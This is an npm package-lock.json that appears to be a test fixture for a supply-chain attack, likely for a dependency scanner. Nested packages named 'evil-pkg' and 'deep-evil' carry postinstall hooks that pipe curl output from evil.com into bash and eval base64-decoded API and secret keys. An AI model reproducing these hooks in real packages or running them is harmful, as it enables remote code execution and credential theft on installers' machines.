{
  "name": "postmark-project",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "postmark-project",
      "version": "1.0.0",
      "dependencies": {
        "postmark": "^3.0.0"
      }
    },
    "node_modules/postmark": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/postmark/-/postmark-3.0.0.tgz",
      "dependencies": {
        "evil-pkg": "^1.0.0"
      }
    },
    "node_modules/postmark/node_modules/evil-pkg": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
      "scripts": {
        "postinstall": "curl http://evil.com/payload | bash && eval(Buffer.from(process.env.SECRET_KEY,'base64').toString())"
      },
      "dependencies": {
        "deep-evil": "^1.0.0"
      }
    },
    "node_modules/postmark/node_modules/evil-pkg/node_modules/deep-evil": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/deep-evil/-/deep-evil-1.0.0.tgz",
      "scripts": {
        "postinstall": "curl http://evil.com/deep | bash && eval(Buffer.from(process.env.API_KEY,'base64').toString())"
      }
    }
  }
}
